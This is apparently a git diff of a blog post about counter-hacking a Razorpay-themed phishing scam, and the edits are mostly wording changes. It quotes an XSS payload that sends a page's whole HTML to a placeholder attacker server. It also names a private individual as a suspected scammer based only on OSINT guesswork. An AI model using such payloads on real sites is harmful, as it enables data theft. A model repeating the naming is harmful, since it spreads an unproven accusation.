@@ -146,7 +146,7 @@ and waited for a request to show up. Soon enough, my logs were populated with fo
 
 ![t](/Images/razorpay/17.png){:.shadow}
 
-There were two unique IPs, `103.182.103.186` and `23.26.221.77`, this was kind of expected, as the scammer was first storing data in a buffer database and then moved it to some other place. In this case `103.182.103.186` is the buffer and `23.26.221.77` is where the data is eventually collected (at least what i think). A simple WHOIS revealed the IPs are located somewhere in Mumbai.
+There were two unique IPs, `103.182.103.186` and `23.26.221.77`, this was kind of expected, as the scammer was first storing data in a buffer database and then moving it to some other place. In this case `103.182.103.186` is the buffer and `23.26.221.77` is where the data is eventually collected (at least what i think). A simple WHOIS revealed the IPs are located somewhere in Mumbai.
 
 ![t](/Images/razorpay/18.png){:.shadow}
 
@@ -154,7 +154,7 @@ There were two unique IPs, `103.182.103.186` and `23.26.221.77`, this was kind o
 
 Both the IPs had RDP and OpenVPN enabled, they are most likely a VPS server as suggested by a friend of mine, used as a pivot point to prevent revealing their real IPs.
 
-Post this, i kinda hit a wall, i tried multiple things around leveraging XSS to get more data, one such attempt worth mentioning was, base64 encoding the current HTML document and sending it over to a server controlled by me. In this manner, if the data was loaded anywhere else, in any other document, it would've given me the entire HTML document, which could've provided more information to play with.
+Post this, i kinda hit a wall, i tried multiple things around leveraging XSS to get more data, one such attempt worth mentioning is, base64 encoding the current HTML document and sending it over to a server controlled by me. In this manner, if the data is loaded anywhere else, in any other document, it would give me the entire HTML document, which could provide more information to play with.
 
 ```js
 <script>const xhr = new XMLHttpRequest();xhr.open('POST', 'https://my-server/data');xhr.send(btoa(escape(encodeURIComponent(document.documentElement.outerHTML))));</script>
@@ -165,7 +165,7 @@ Even though i cannot directly comment on who the scammer is, but there are piece
 
 ![t](/Images/razorpay/14.png){:.shadow}
 
-On doing some OSINT, we can see the skill set of `Vijay Bharbhaya` matches the tech-stack used by the phishing applications.
+On doing some OSINT, i saw, the skill set of `Vijay Bharbhaya` matched the tech-stack used by the phishing applications.
 
 ![t](/Images/razorpay/15.png){:.shadow}
 
@@ -195,7 +195,8 @@ There are different ways in which people with different skillset can contribute 
 4. If you are in cybercrime police department or know someone, reach out to the ISP, as they don't entertain emails normally.
 5. Share the scam information with as many people as possible, the only long term way to defeat this, is to be aware of what to click and where to submit.
 6. Lastly, if you find a new phishing scam, or a phishing website, or anything that aims to scam people, let us know. It's not possible to hack everything and anything on the internet, but the best we could do is try with what we have.
-## Conclusion
+#
+# Conclusion
 
 This experience made me realise the true meaning of the quote *with great power, comes great responsibility* and also gave me an insight into how direct our impact can be on the society as hackers. I really hope, we all come together to fight against these evils and not just die finishing client reports. Let's make internet a safer place.
 
